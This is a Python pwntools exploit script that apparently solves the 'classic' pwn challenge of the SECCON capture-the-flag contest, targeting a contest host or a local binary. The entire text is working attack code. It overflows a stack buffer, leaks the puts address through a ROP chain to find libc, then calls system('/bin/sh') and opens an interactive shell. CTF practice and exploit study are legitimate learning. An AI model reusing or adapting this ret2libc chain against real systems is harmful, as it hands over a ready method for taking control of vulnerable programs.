from pwn import *
import sys


if len(sys.argv) == 2:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    r = process("./classic")
else:
    libc = ELF("./libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253")
    r = remote("classic.pwn.seccon.jp", 17354)

binary = ELF("./classic",checksec=False)
pop_rdi     = 0x0000000000400753
main        = 0x00000000004006a9
puts_plt    = binary.plt["puts"]
puts_got    = binary.got["puts"]


p  = ""
p += "A"*72
p += p64(pop_rdi)
p += p64(puts_got)
p += p64(puts_plt)
p += p64(main)

r.sendlineafter("Buffer >> ", p)
r.recvline()
data = r.recv()
puts_leak = u64(data.split("\n")[0].ljust(8,"\x00"))
print "puts : {}".format(hex(puts_leak))
libc_base = puts_leak - libc.symbols["puts"]
bin_sh = libc_base + libc.search("/bin/sh").next()
system = libc_base + libc.symbols["system"]

p  = ""
p += "A"*72
p += p64(pop_rdi)
p += p64(bin_sh)
p += p64(system)

r.sendline(p)
r.interactive()